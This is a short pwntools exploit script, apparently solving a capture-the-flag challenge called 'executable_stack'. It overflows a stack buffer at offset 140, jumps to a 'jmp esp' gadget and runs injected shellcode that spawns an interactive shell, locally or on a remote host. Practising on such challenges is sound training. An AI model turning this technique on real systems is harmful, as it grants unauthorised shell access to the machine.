from pwn import (
    asm,
    args,
    gdb,
    remote,
    process,
    p64,
    u64,
    shellcraft,
    flat,
    ROP,
    ELF,
    context,
    log,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
b *chall+45
continue
""".format(**locals())

exe = "./executable_stack"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

offset = 140

io = start()

shellcode = asm(shellcraft.sh())
shellcode += asm(shellcraft.exit(0))
jmp_esp = 0x080484B3

payload = flat({offset: [jmp_esp, shellcode]})


io.sendline(payload)
io.interactive()
